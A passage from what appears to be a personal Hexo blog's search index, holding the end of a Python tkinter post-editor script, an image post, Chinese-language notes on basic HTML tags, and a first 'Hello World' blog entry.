class="string">&#x27;\n```\n&#x27;</span></span><br><span class="line">    content.insert(<span class="string">&#x27;end&#x27;</span>,changing_content)</span><br><span class="line">    add_bash_text.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line">label1=tkinter.Label(text=<span class="string">&#x27;标题&#x27;</span>,padx=10,pady=10)</span><br><span class="line">label1.grid(row=0,column=0)</span><br><span class="line"></span><br><span class="line">title=tkinter.Text(width=40,height=2)</span><br><span class="line">title.grid(row=0,column=1,columnspan=2)</span><br><span class="line"></span><br><span class="line">label2=tkinter.Label(text=<span class="string">&#x27;标签&#x27;</span>,padx=5,pady=5)</span><br><span class="line">label2.grid(row=1,column=0)</span><br><span class="line"></span><br><span class="line">tags=tkinter.Text(width=30,height=1)</span><br><span class="line">tags.grid(row=1,column=1)</span><br><span class="line"></span><br><span class="line">label3=tkinter.Label(text=<span class="string">&#x27;正文&#x27;</span>,padx=5,pady=5)</span><br><span class="line">label3.grid(row=2,column=0)</span><br><span class="line"></span><br><span class="line">content=tkinter.Text(width=40,height=20)</span><br><span class="line">content.grid(row=2,column=1,rowspan=5)</span><br><span class="line"></span><br><span class="line">add_bash_button=tkinter.Button(win,text=<span class="string">&#x27;命令行&#x27;</span>,<span class="built_in">command</span>=add_bash)</span><br><span class="line">add_bash_button.grid(row=9,column=0)</span><br><span class="line"></span><br><span class="line">add_bash_text=tkinter.Text(width=40,height=5)</span><br><span class="line">add_bash_text.grid(row=9,column=1)</span><br><span class="line"></span><br><span class="line">save_button=tkinter.Button(win,text=<span class="string">&#x27;保存&#x27;</span>,<span class="built_in">command</span>=processandsave)</span><br><span class="line">save_button.grid(row=8,column=1)</span><br><span class="line"></span><br><span class="line">win.mainloop()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thanksgiving</title>
      <link href="2021/04/10/img_share/"/>
      <url>2021/04/10/img_share/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.helloimg.com/images/2020/11/28/bb7b96be-d4be-4657-b90c-a5f1df2909619ac20bd2ad5eb347.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2020/11/28/bb7b96be-d4be-4657-b90c-a5f1df2909619ac20bd2ad5eb347.jpg" srcset="data:image/png;base64,666" alt="arknights_20201128"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTML笔记</title>
      <link href="2021/04/10/HTML_notes/"/>
      <url>2021/04/10/HTML_notes/</url>
      
        <content type="html"><![CDATA[<pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;h1&gt; to &lt;/h6&gt;: 一到六号标题</span><br><span class="line">2 &lt;p&gt;段落&lt;/p&gt;</span><br><span class="line">3 &lt;body style=<span class="string">&quot;background-color:PowderBlue;&quot;</span>&gt;</span><br><span class="line">  &lt;p style=<span class="string">&quot;font-family:verdana;color:red&quot;</span>&gt;对段落样式进行修改&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">4 &lt;br /&gt;&lt;hr /&gt;&lt;!这是注释，前面的是换行和分割线&gt;</span><br><span class="line">5 &lt;b&gt;被加粗的内容&lt;/b&gt;</span><br><span class="line">6 &lt;strong&gt;被...加粗的内容...吧&lt;/strong&gt;</span><br><span class="line">7 &lt;big&gt;被加大的内容&lt;/big&gt;</span><br><span class="line">8 &lt;em&gt;被强调(加斜)的内容&lt;/em&gt;</span><br><span class="line">9 &lt;i&gt;被...意大利式加斜的内容&lt;/i&gt;</span><br><span class="line">10 &lt;small&gt;被减小的内容&lt;/small&gt;</span><br><span class="line">11 &lt;sub&gt;位于右下角的小字部分&lt;/sub&gt;</span><br><span class="line">12 &lt;sup&gt;位于右上角的小字部分&lt;/sup&gt;</span><br><span class="line">13 &lt;pre&gt;预格式文本(保留了空格和换行)&lt;/pre&gt;</span><br><span class="line">14 &lt;code&gt;用于&lt;/code&gt;,&lt;kbd&gt;显示&lt;/kbd&gt;,&lt;samp&gt;代码&lt;/samp&gt;,&lt;var&gt;这个加大加粗了一点&lt;/var&gt;</span><br><span class="line">15 &lt;address&gt;用于书写地址，其中记得手动添加换行标签&lt;/address&gt;</span><br><span class="line">16 &lt;abbr title=<span class="string">&quot;etcetera&quot;</span>&gt;etc.&lt;/abbr&gt;</span><br><span class="line">17 &lt;acronym title=<span class="string">&quot;World Wide Web&quot;</span>&gt;WWW&lt;/acronym&gt;</span><br><span class="line">18 &lt;bdo dir=<span class="string">&quot;rtl&quot;</span>&gt;印打序倒&lt;/bdo&gt;</span><br><span class="line">19 &lt;blockquote&gt;块引用&lt;/blockquote&gt;,&lt;q&gt;短引用&lt;/q&gt;</span><br><span class="line">20 &lt;p&gt;你看&lt;del&gt;我被划掉了&lt;/del&gt;&lt;ins&gt;又被加下划线了&lt;/ins&gt;&lt;/p&gt;</span><br><span class="line">21 &lt;a name=<span class="string">&quot;tips&quot;</span>&gt;基本的注意事项 - 有用的提示&lt;/a&gt; &lt;a href=<span class="string">&quot;#tips&quot;</span>&gt;有用的提示&lt;/a&gt;</span><br><span class="line">22 &lt;img src=<span class="string">&quot;url&quot;</span> width=xx height=xx align=xxx /&gt;</span><br><span class="line">23 &lt;table border=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;th&gt;Heading&lt;/th&gt;</span><br><span class="line">     &lt;th&gt;Another Heading&lt;/th&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;td&gt;row 1, cell 1&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;row 1, cell 2&lt;/td&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;td&gt;row 2, cell 1&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;row 2, cell 2&lt;/td&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt;</span><br><span class="line">24 &lt;ul&gt;&lt;!unsorted list&gt;</span><br><span class="line">     &lt;li&gt;Coffee&lt;/li&gt;</span><br><span class="line">     &lt;li&gt;Milk&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">25 &lt;ol&gt;&lt;!ordered list&gt;</span><br><span class="line">     &lt;li&gt;Coffee&lt;/li&gt;</span><br><span class="line">     &lt;li&gt;Milk&lt;/li&gt;</span><br><span class="line">     &lt;/ol&gt;</span><br><span class="line">26 &lt;dl&gt;&lt;!defined list&gt;</span><br><span class="line">     &lt;dt&gt;Coffee&lt;/dt&gt;</span><br><span class="line">     &lt;dd&gt;Black hot drink&lt;/dd&gt;</span><br><span class="line">     &lt;dt&gt;Milk&lt;/dt&gt;</span><br><span class="line">     &lt;dd&gt;White cold drink&lt;/dd&gt;</span><br><span class="line">     &lt;/dl&gt;</span><br><span class="line">27 &lt;head&gt;</span><br><span class="line">     &lt;style&gt;</span><br><span class="line">     .cities &#123;</span><br><span class="line">         background-color:black;</span><br><span class="line">         color:white;</span><br><span class="line">         margin:20px;</span><br><span class="line">         padding:20px;</span><br><span class="line">     &#125; </span><br><span class="line">     &lt;/style&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">28 &lt;!DOCTYPE html&gt;</span><br><span class="line">     &lt;html&gt;</span><br><span class="line">     &lt;head&gt;</span><br><span class="line">     &lt;style&gt;</span><br><span class="line">       span.red &#123;color:red;&#125;</span><br><span class="line">     &lt;/style&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">     &lt;body&gt;</span><br><span class="line"></span><br><span class="line">     &lt;h1&gt;My &lt;span class=<span class="string">&quot;red&quot;</span>&gt;Important&lt;/span&gt; Heading&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">     &lt;/body&gt;</span><br><span class="line">     &lt;/html&gt;</span><br><span class="line">29 &lt;iframe src=<span class="string">&quot;demo_iframe.htm&quot;</span> width=<span class="string">&quot;200&quot;</span> height=<span class="string">&quot;200&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">30 &lt;body background=<span class="string">&quot;http://www.w3school.com.cn/clouds.gif&quot;</span>&gt;</span><br><span class="line">31 &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">     document.write(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line">     &lt;noscript&gt;Your browser does not support JavaScript!&lt;/noscript&gt;</span><br></pre></td></tr></table></figure></pre><p><a href="https://www.w3school.com.cn/html/html_quick.asp">Quick Search</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0</title>
      <link href="2020/03/22/0/"/>
      <url>2020/03/22/0/</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-World！"><a href="#Hello-World！" class="headerlink" title="Hello,World！"></a>Hello,World！</h2><p>说人话 我终于有自己的网站啦 虽然只是部署在github上的<br>先做个测试 下回在看看要弄啥<br>peach..啊不…<br>peace～～</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
